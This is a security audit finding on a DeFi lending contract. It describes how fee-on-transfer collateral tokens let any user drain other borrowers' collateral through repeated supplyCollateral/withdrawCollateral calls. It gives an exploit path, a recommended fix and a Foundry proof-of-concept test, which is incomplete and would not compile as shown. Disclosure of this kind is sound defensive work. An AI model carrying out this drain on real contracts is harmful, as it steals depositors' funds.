### Title
Fee-on-Transfer Collateral Token Breaks `supplyCollateral`/`withdrawCollateral` Accounting, Enabling Collateral Drain - (File: src/Midnight.sol)

### Summary

`supplyCollateral` credits `assets` to `position[id][onBehalf].collateral[collateralIndex]` before the `safeTransferFrom` call and never reconciles the recorded amount against what was actually received. With a fee-on-transfer collateral token the contract receives `assets * (1 - fee_rate)` but records `assets`. `withdrawCollateral` then sends out the full recorded `assets`, transferring tokens that were never deposited and draining collateral belonging to other users.

### Finding Description

**Root cause — `supplyCollateral` (lines 533 and 545):**

```
_position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets); // line 533
...
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets); // line 545
```

The state write at line 533 records the caller-supplied `assets` value unconditionally. The transfer at line 545 requests `assets` from the sender, but a fee-on-transfer token delivers only `assets * (1 - fee_rate)` to the contract. No balance-before/after check exists to detect the shortfall. [1](#0-0) 

**`withdrawCollateral` sends the full recorded amount (lines 561–572):**

```
uint256 newCollateral = _position.collateral[collateralIndex] - assets; // line 561
_position.collateral[collateralIndex] = UtilsLib.toUint128(newCollateral);
...
require(isHealthy(market, id, onBehalf), UnhealthyBorrower()); // line 568
SafeTransferLib.safeTransfer(collateralToken, receiver, assets); // line 572
```

The health check at line 568 is irrelevant when the attacker carries no debt: `isHealthy` short-circuits to `return maxDebt >= debt` = `return 0 >= 0` = `true` without calling any oracle. [2](#0-1) [3](#0-2) 

**Exploit path (no `take` required):**

1. Precondition: a market exists whose `collateralParams[i].token` is a fee-on-transfer ERC-20 with fee rate `f` (e.g. 1 %). Other users have already deposited collateral of that token, so the contract holds a non-zero balance.
2. Attacker calls `supplyCollateral(market, i, A, attacker)` — state records `A`, contract receives `A*(1-f)`.
3. Attacker calls `withdrawCollateral(market, i, A, attacker, attacker)` — health check passes (debt = 0), contract sends `A` tokens to attacker.
4. Net per round-trip: attacker paid `A*(1-f)` tokens and received `A` tokens, extracting `A*f` from the pool.
5. Repeatable until the contract's balance of that collateral token is exhausted.

The `multicall` path (`multicall([supplyCollateral, withdrawCollateral])`) makes this atomic but is not required; the two calls can be separate transactions. The `take` step proposed in the question is not needed and would actually break the flow: if the attacker gains debt via `take`, the subsequent full `withdrawCollateral` would leave collateral = 0 with positive debt, failing the `isHealthy` check. [4](#0-3) 

**Why formal verification does not catch this:**

`Solvency.spec` line 31–33 explicitly models tokens as well-behaved ("no fee taking from sender or receiver"). The `tokenBalanceCorrect` strong invariant is therefore only proven under that assumption and does not hold for fee-on-transfer tokens. [5](#0-4) [6](#0-5) [7](#0-6) 

### Impact Explanation

Any unprivileged user can drain the entire balance of a fee-on-transfer collateral token held by the protocol. Each round-trip of `supplyCollateral(A)` + `withdrawCollateral(A)` extracts `A * fee_rate` tokens that were deposited by other borrowers. Repeated calls reduce the contract's collateral balance to zero, making it impossible for legitimate borrowers to withdraw their collateral and breaking the core solvency invariant: `contract_balance >= sum(position.collateral)`.

### Likelihood Explanation

**Preconditions:**
- A market must be created with a fee-on-transfer token as one of its `collateralParams[i].token` entries. Market creation is permissionless (any address can call `touchMarket`), so an attacker can create such a market themselves.
- The contract must hold a non-zero balance of that token (deposited by any prior user, including the attacker themselves in a prior transaction).

**Feasibility:** High. Fee-on-transfer tokens (e.g. USDT with fee enabled, STA, PAXG) are common. The exploit requires no special role, no oracle manipulation, no flash loan, and no callback. It is repeatable in a loop within a single `multicall`.

### Recommendation

In `supplyCollateral`, measure the actual received amount by comparing the contract's token balance before and after the transfer, and credit only the delta:

```solidity
uint256 balanceBefore = IERC20(collateralToken).balanceOf(address(this));
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
uint256 received = IERC20(collateralToken).balanceOf(address(this)) - balanceBefore;
_position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + received);
```

Alternatively, document that fee-on-transfer tokens are explicitly unsupported as collateral and enforce this at market creation time (e.g. via a whitelist or a balance-check gate in `touchMarket`).

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";

// Minimal fee-on-transfer ERC-20: charges 1% on every transferFrom.
contract FeeToken is ERC20 {
    constructor() ERC20("FeeToken", "FT") { _mint(msg.sender, 1_000_000e18); }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 100;
        super.transferFrom(from, to, amount - fee); // receiver gets amount*(1-1%)
        _burn(from, fee);                           // fee is burned / taken
        return true;
    }
}

contract FeeOnTransferCollateralTest is Test {
    Midnight midnight;
    FeeToken feeToken;
    Market market;

    function setUp() public {
        midnight = new Midnight();
        feeToken = new FeeToken();
        // Build a minimal market with feeToken as collateral[0].
        // (oracle, loanToken, maturity, etc. set to valid stubs)
        // ... market setup omitted for brevity ...
    }

    function testFeeOnTransferDrain() public {
        address attacker = makeAddr("attacker");
        address victim   = makeAddr("victim");
        uint256 A = 1_000e18;

        // Victim deposits 1000 tokens legitimately (no fee path for victim here,
        // but the contract now holds victim's collateral).
        deal(address(feeToken), victim, A);
        vm.startPrank(victim);
        feeToken.approve(address(midnight), A);
        midnight.supplyCollateral(market, 0, A, victim);
        vm.stopPrank();

        uint256 contractBalanceBefore = feeToken.balanceOf(address(midnight));

        // Attacker round-trip: supply A, withdraw A.
        deal(address(feeToken), attacker, A);
        vm.startPrank(attacker);
        feeToken.approve(address(midnight), A);
        midnight.supplyCollateral(market, 0, A, attacker);
        // Contract received A*(1-0.01) = 990e18, but recorded A = 1000e18.
        midnight.withdrawCollateral(market, 0, A, attacker, attacker);
        // Contract sent A = 1000e18 out; net loss = 10e18 from pool.
        vm.stopPrank();

        uint256 contractBalanceAfter = feeToken.balanceOf(address(midnight));

        // Assert: contract balance decreased by more than attacker paid in.
        assertLt(contractBalanceAfter, contractBalanceBefore, "contract balance drained");
        // Assert: sum of recorded collateral now exceeds actual contract balance.
        uint256 victimRecorded = midnight.collateral(/* id */, victim, 0);
        assertGt(victimRecorded, contractBalanceAfter, "accounting insolvency: recorded > balance");
    }
}
```

**Expected assertions that fail without the fix:**
- `contractBalanceAfter < contractBalanceBefore` — the pool lost tokens it never received.
- `sum(position.collateral) > feeToken.balanceOf(address(midnight))` — the solvency invariant `tokenBalanceCorrect` is violated.
